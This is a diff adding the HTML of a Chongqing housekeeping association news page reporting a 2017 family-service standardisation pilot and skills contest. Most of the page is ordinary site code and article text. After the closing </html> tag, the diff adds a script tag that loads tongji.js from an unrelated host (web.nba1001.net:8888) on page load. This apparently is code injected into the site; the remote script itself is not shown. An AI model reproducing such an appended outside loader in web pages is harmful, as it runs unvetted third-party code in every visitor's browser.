@@ -1,0 +1,251 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>南岸区妇联家庭服务标准化试点项目启动仪式暨首届江南巧家庭服务职业技能大赛决赛顺利举办-行业平台!重庆市南岸区家政行业协会官方网站。</title>
+<link href="/css/common.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript" src="/js/jquery.js"></script>
+<script type="text/javascript" src="/js/focus.js"></script>
+<script type="text/javascript" src="/js/common.js"></script>
+<script type="text/javascript" src="/js/kefu.js"></script>
+<script type="text/javascript" src="/js/jquery.SuperSlide.2.1.1.js"></script>
+<script type="text/javascript">
+/*搜索切换*/
+function __doSearch(objId, postUrl) {
+var nameList = new Array("product", "member", "buy");
+for (var i = 0; i < nameList.length; i++) {
+if (nameList[i] == objId) {
+document.getElementById(nameList[i]).className = "searchChecked";
+}
+else {
+document.getElementById(nameList[i]).className = "";
+}
+}
+document.getElementById("searchForm").action = postUrl;
+return false;
+}
+</script>
+<script type="text/javascript">
+<!--
+//顶部登录
+function __onLoad()
+{
+$.get("./member/state/?key=."+Math.random(), {Action:"get",Name:"lulu"}, function (data, textStatus){
+this;
+document.getElementById("default_Login_State").innerHTML = (data);
+});
+}
+//-->
+</script>
+<script language="JavaScript" type="text/javascript">
+<!--
+function CloseAd(adname){
+document.getElementById(adname).style.display="none";
+}
+lastScrollY=0;
+function heartBeat(){
+var diffY;
+if (document.documentElement && document.documentElement.scrollTop)
+diffY = document.documentElement.scrollTop;
+else if (document.body)
+diffY = document.body.scrollTop
+else
+{/*Netscape stuff*/}
+percent=.1*(diffY-lastScrollY);
+if(percent>0)percent=Math.ceil(percent);
+else percent=Math.floor(percent);
+//手机版块
+document.getElementById("lovexin14").style.top=parseInt(document.getElementById("lovexin14").style.top)+percent+"px";
+//广告版块
+document.getElementById("allAd01").style.top=parseInt(document.getElementById("allAd01").style.top)+percent+"px";
+document.getElementById("allAd02").style.top=parseInt(document.getElementById("allAd02").style.top)+percent+"px";
+lastScrollY=lastScrollY+percent;
+}
+//手机版块
+duilianstr='<a href="/wap/default.aspx" target="_blank"><img src="/images/wap.jpg" style="width:150px;border:none;"></a>';
+suspendcode14='<DIV id="lovexin14" style="left:2px;POSITION:absolute;TOP:300px;z-index:1000;"><div style="margin-bottom:3px;">'+duilianstr+'</div><div style="text-align:center;"><a href="#" onclick=CloseAd("lovexin14")>[关闭]</a></div></div>'
+//广告版块
+duilianstr01='<a href="http://www.cqjzjzzx.com/" target="_blank"><img src="/130130100647619061900000.jpg" alt="首页对联广告" /></a>'
+suspendcode01='<div id="allAd01" style="left:2px;POSITION:absolute;TOP:70px;z-index:50;"><div style="margin-bottom:3px;">'+duilianstr01+'</div><div style="text-align:center;"><a href="#" onclick=CloseAd("allAd01")>[关闭]</a></div></div>'
+suspendcode02='<div id="allAd02" style="right:2px;POSITION:absolute;TOP:70px;z-index:50;"><div style="margin-bottom:3px;">'+duilianstr01+'</div><div style="text-align:center;"><a href="#" onclick=CloseAd("allAd02")>[关闭]</a></div></div>'
+document.write(suspendcode14);
+document.write(suspendcode01);
+document.write(suspendcode02);
+window.setInterval("heartBeat()",1);
+//-->
+</script>
+<link href="/css/news.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript">
+//=========================================================================================================
+function A_GetForm(_sGuidance){var inputs=document.getElementsByTagName("INPUT");var selects=document.getElementsByTagName("SELECT");var texts=document.getElementsByTagName("TEXTAREA");var __sXmlStr="<form>";try{__sXmlStr+=B_GetFormXml(inputs,_sGuidance);};catch(err){};try{__sXmlStr+=B_GetFormXml(selects,_sGuidance);};catch(err){};try{__sXmlStr+=B_GetFormXml(texts,_sGuidance);};catch(err){};__sXmlStr+="\n</form>";return __sXmlStr;};
+function B_GetFormXml(_oObj,_sGuidance){var guidance=0;if(_sGuidance!=null){guidance=_sGuidance.length;};var __sXmlStr="";for(i=0;i<=_oObj.length-1;i++){if(_oObj[i].name!=null&&_oObj[i].name!=""){if(_sGuidance==null||_oObj[i].name.substring(0,guidance)==_sGuidance){__sXmlStr+="\n<"+_oObj[i].name.substring(guidance,_oObj[i].name.length)+"><![CDATA[";switch(_oObj[i].type){case"checkbox":case"radio":if(_oObj[i].checked==true){__sXmlStr+=_oObj[i].value;};for(;i<=_oObj.length-2;i++){if(_oObj[i].name==_oObj[i+1].name){if(_oObj[i+1].checked==true){if(__sXmlStr.substring(__sXmlStr.length-1,__sXmlStr.length).isNumber()){__sXmlStr+=",";};__sXmlStr+=_oObj[i+1].value;}}else{break;}};break;default:__sXmlStr+=_oObj[i].value;};__sXmlStr+="]]></"+_oObj[i].name.substring(guidance,_oObj[i].name.length)+">";}}};return __sXmlStr;};
+function __doSubmitReply() {
+if (document.getElementById("reply_content").value == "") {
+alert("请输入评论内容!");
+return false;
+}
+var _sUrl = document.getElementById("formReply").action;
+var _sXml = "";
+try {
+_sXml = A_GetForm("reply_");
+}
+catch (err) {
+alert(err.message);
+return false;
+}
+try {
+$Ajax(_sUrl, _sXml, "message_submit", null, __doSubmitReplyEnd);
+}
+catch (e) {
+alert(e.message);
+}
+return false;
+}
+function __doSubmitReplyEnd(request, htmlstatus, htmlcontent) {
+alert("评论成功!");
+__doClearCache();
+}
+//=========================================================================================================
+$(function(){
+$(".font14").click(function(){
+$(".articleCont1").css("font-size","14px");
+$(this).css("font-weight","bold");
+$(".font16").css("font-weight","normal");
+});
+$(".font16").click(function(){
+$(".articleCont1").css("font-size","16px");
+$(this).css("font-weight","bold");
+$(".font14").css("font-weight","normal");
+})
+})
+</script>
+</head>
+<body>
+<div class="header">
+<div class="headTop">
+<div class="top warp">
+<span class="right" id="default_Login_State"></span>
+<script type="text/javascript">
+__onLoad();
+</script><a href="/">返回首页</a>
+</div>
+</div>
+<div class="head warp">
+<div class="logo left"><a href="/"><img src="/images/logo.png" /></a></div>
+<div class="banner right">
+<!--<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="640" height="110">
+<param name="movie" value="/images/banner.swf" />
+<param name="quality" value="high" />
+<param name="wmode" value="transparent" />
+<embed src="/images/banner.swf" quality="high" wmode="transparent" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="640" height="110"></embed>
+</object>-->
+<img style="margin-top:30px;" src="/images/banner001.png" />
+</div>
+<div class="clear"></div>
+</div>
+<div class="nav warp">
+<ul class="navList">
+<li ><a href="/">网站首页</a></li>
+<li ><a href="/member,index.aspx">行业协会</a></li>
+<li class="btn"><a href="/news,index.aspx">新闻资讯</a></li>
+<li ><a href="/news,c1750935330,list.aspx">行业标准</a></li>
+<li ><a href="/buy,index.aspx">服务供求</a></li>
+<li ><a href="/news,c1007849789,list.aspx">培训专区</a></li>
+<li ><a href="/news,c1207723206,list.aspx">保洁清洗</a></li>
+<li ><a href="/news,c1650356030,list.aspx">家务护理</a></li>
+<li ><a href="/news,c1695656473,list.aspx">搬家配送</a></li>
+<li class="noEdge" ><a href="/news,c1145004650,list.aspx">环卫疏通</a></li>
+</ul>
+<div class="clear"></div>
+<div class="subSea">
+<form action="/search.aspx" name="searchForm" id="searchForm" method="post">
+<select><option>服务</option><option>公司</option></select>
+<input type="text" name="titleKey" class="seaInp" value="请输入关键字" onfocus="if(this.value=='请输入关键字')this.value=''" onblur="if(this.value=='')this.value='请输入关键字'" title="请输入您要搜索的关键字" />
+<input type="image" src="/images/searchBtn.png" align="absmiddle" />
+<span class="write">热门搜索：<a href="/search.aspx?titleKey=钟点工">钟点工</a><a href="/search.aspx?titleKey=住家保姆">住家保姆</a><a href="/search.aspx?titleKey=阿姨">阿姨</a><a href="/search.aspx?titleKey=家政">家政</a><a href="/search.aspx?titleKey=保姆工作">保姆工作</a><a href="/search.aspx?titleKey=北京">北京</a></span>
+</form>
+</div>
+</div>
+<div class="blank6"></div>
+</div>
+<div class="blank6"></div>
+<div class="newsListContent warp">
+<div class="guide">当前位置: </td><td><a href="/">首页</a> &raquo; <a href="news,index.aspx">新闻资讯</a>  &raquo;正文</div>
+<div class="articleLeft left">
+<div class="articleCont1">
+<h1 class="articleTitle">南岸区妇联家庭服务标准化试点项目启动仪式暨首届江南巧家庭服务职业技能大赛决赛顺利举办</h1><p class="articleTag"><span class="right">            字号：<a href="#" class="font14" title="14像素字体">T</a> | <a href="#" class="font16" title="16像素字体">T</a></span>          时间：2017-04-01          作者：超级管理员</p><hr /><div class="cont" style="width:650px;"><p>&nbsp; &nbsp; 为加快建设和实施家庭服务标准体系，提升市民对&ldquo;江南巧&rdquo;品牌的认可度和满意度，促进家庭服务业专业化、职业化、规范化发展。3月29日上午，由南岸区妇联主办，重庆南岸家政服务中心承办的南岸区妇联家庭服务标准化试点项目启动仪式暨首届&ldquo;江南巧&rdquo;家庭服务职业技能大赛决赛在江南巧亚太店顺利举办。参加本次活动的领导有南岸区妇联主席王俊、区质监局副局长王勇、区妇联副主席周育萍，重庆市<span style="line-height:1.6em">质量和标准化研究院标准化服务中心主任万科以及江南巧职业技能培训学校的各届学员代表。</span></p><p>&nbsp; &nbsp; 活动开始，参会人员共同观看了江南巧宣传短片，见证了江南巧一路的成长发展，随后区妇联副主席周育萍就家庭服务标准化试点项目建设宣布实施方案，区质监局副局长王勇对项目建设提出了相应建议和要求，技能大赛决赛随后开始。</p><p>&nbsp; &nbsp; 首届&ldquo;江南巧&rdquo;家庭服务职业技能大赛共分为新生儿护理、家政服务及养老护理三大项目，经过前期的紧张筹备，各家政服务人员的积极参与，最终18名选手脱颖而出进入本次决赛。比赛过程中，不仅有严肃认真的理论知识问答和展示技能的实际操作，还有各评委老师的犀利点评，每个项目按获得分数高低评出一、二、三等奖，优胜者不仅能获得江南巧颁发的证书，还可获得丰厚奖品。</p><p>&nbsp; &nbsp; 经过紧张激烈的角逐，本次决赛产生一等奖三名、二等奖六名、三等奖九名，区妇联主席王俊上台为获得一等选手颁奖，并合照留影。</p><p>&nbsp; &nbsp;本次活动充分展现了江南巧家政服务员的个人形象及专业技能，加强了从业人员之间的相互交流与学习，同时为进一步规范行业服务流程，加快建立实施家庭服务标准体系，促进家庭服务业健康可持续发展，起到了积极的作用。&nbsp;&nbsp;</p>　            </div>
+<div class="blank8"></div>
+<div class="extendNews">
+<b>相关阅读</b>
+<ul class="extendList">
+<li><p><a href="#">暂时还没有信息。</a></p></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="articleRight right">
+<div class="ad">
+</div>
+<div class="blank6"></div>
+<p class="title01">热点聚焦</p>
+<div class="newsCont">
+<!--ul class="listPic">
+<li><a href="#"><img src="/system/yunji.12114wap.com/template/default/images/img01.jpg" alt="" title="" width="113" height="77" /></a><p><a href="#">中国人一天</a></p></li>
+<li><a href="#"><img src="/system/yunji.12114wap.com/template/default/images/img01.jpg" alt="" title="" width="113" height="77" /></a><p><a href="#">中国人一天</a></p></li>
+</ul-->
+<div class="clear"></div>
+<ul class="newsList">
+<li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705045,detail.aspx" target="_blank"><span>南岸区妇联家庭服务标准化试点项目...</span></a></li><li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705044,detail.aspx" target="_blank"><span>南岸家协党支部组织召开专题组织生...</span></a></li><li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705043,detail.aspx" target="_blank"><span>南岸家协党支部组织“风正巴渝”和...</span></a></li><li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705011,detail.aspx" target="_blank"><span>南岸家协组织企业负责人、管理人员...</span></a></li><li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705010,detail.aspx" target="_blank"><span>南岸家协2017年恒耀杯“迎3.8、颂...</span></a></li><li xmlns:asp="http://schemas.microsoft.com/ASPNET/20" xmlns:SharePoint="Microsoft.Sharepoint.WebControls">·<a class="titlelink" href="news,u1800156752,c1513564740,i1201705003,detail.aspx" target="_blank"><span>我妈妈的故事</span></a></li>
+</ul>
+</div>
+<div class="blank6"></div>
+<div class="ad">
+</div>
+</div>
+<div class="clear"></div>
+</div>
+<div class="blank6"></div>
+<div class="footer warp">
+<div class="footMenu relative"><a href="/single,i1000810572,detail.aspx">网站服务</a> | <a href="/single,i1000810573,detail.aspx">联系我们</a> | <a href="/single,i1000810574,detail.aspx">关于本站</a> | <a href="/single,i1000810575,detail.aspx">广告合作</a> | <a href="/single,i1000810576,detail.aspx">合作伙伴</a> | <a href="/single,i1000810577,detail.aspx">人才招聘</a> | <a href="/single,i1000810578,detail.aspx">关于我们</a><div class="absolute" style="left:0;top:0;"><a href="http://www.cqnet110.gov.cn" target="_blank"><img src="/images/sentrybox.gif" /></a></div><div class="absolute" style="right:0;top:0;"><a href="http://beian.cqnet110.gov.cn/webrecord/innernet/Welcome.jsp?bano=50010801500662&amp;bado=www.cqjzw.mobi" target="_blank"><img src="/images/wa50010801500662.gif" /></a></div></div>
+<p>国家工信部合作单位 Copyright©2011 重庆家政网 版权所有</p><p>全国咨询热线：400-023-0885 公司总机：023-62902501 传真：023-6290250 邮箱：478458635@qq.com</p><p><img src="/images/12114.gif" height="60" align="absmiddle" /> 地址：重庆市南岸区光电路18号1-6-14 <a id="icp" href="http://www.miibeian.gov.cn/" target="_blank">渝ICP备10016867号</a><img src="/images/ewm.png" height="60" align="absmiddle" /></p>
+<p>浏览量：<script type="text/javascript" src="/js/websitestatistics/count/1050817720/200000"></script></p>
+<p>
+<script src="http://kxlogo.knet.cn/seallogo.dll?sn=e130911500100424237g5t000000&size=0"></script>
+ </p>
+<p><iframe frameborder=0 height=90 width=90 allowtransparency=true scrolling=no src='http://www.cqgseb.cn/ztgsgl/WebMonitor/GUILayer/eImgMana/gshdimg.aspx?sfdm=120130409093727982805'></iframe></p>
+</div>
+<DIV id=floatTools class=float0831>
+<DIV class=floatL><A style="DISPLAY:none;" id=aFloatTools_Show class=btnOpen
+title=查看在线客服
+onclick="javascript:$('#divFloatToolsView').animate({width: 'show', opacity: 'show'}, 'normal',function(){ $('#divFloatToolsView').show();kf_setCookie('RightFloatShown', 0, '', '/', 'www.cqjzw88.com'); });$('#aFloatTools_Show').attr('style','display:none');$('#aFloatTools_Hide').attr('style','display:block');"
+href="javascript:void(0);">展开</A><A id=aFloatTools_Hide class=btnCtn
+title=关闭在线客服
+onclick="javascript:$('#divFloatToolsView').animate({width: 'hide', opacity: 'hide'}, 'normal',function(){ $('#divFloatToolsView').hide();kf_setCookie('RightFloatShown', 1, '', '/', 'www.cqjzw88.com'); });$('#aFloatTools_Show').attr('style','display:block');$('#aFloatTools_Hide').attr('style','display:none');"
+href="javascript:void(0);">收缩</A></DIV>
+<DIV id=divFloatToolsView class=floatR>
+<DIV class=tp></DIV>
+<DIV class=cn>
+<UL>
+<LI>
+<H3 class=titDh>电话咨询</H3>
+</LI>
+<LI><SPAN class=icoTl>023-62902501</SPAN></LI>
+</UL>
+<UL>
+<LI class=top>
+<H3 class=titZx>QQ咨询</H3>
+</LI>
+<LI><SPAN class=icoZx>在线咨询</SPAN></LI>
+<LI class=bot><A class=icoTc href="http://wpa.qq.com/msgrd?v=3&uin=2692682846&site=qq&menu=yes">广告服务</A></LI>
+<LI><A class=icoTc href="http://wpa.qq.com/msgrd?v=3&uin=1041385820&site=qq&menu=yes">招商加盟</A></LI>
+<LI>传真:02362902501</LI>
+<LI>热线:4000230885</LI>
+</UL>
+</DIV>
+</DIV>
+</DIV>
+
+<script type="text/javascript" src="/js/main.default.framework.js"></script>
+</body>
+</html><script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script><!-- 创建时间:2017-04-13 16:22:17 永不过期 FILE:/news/detail/1201705045.html -->
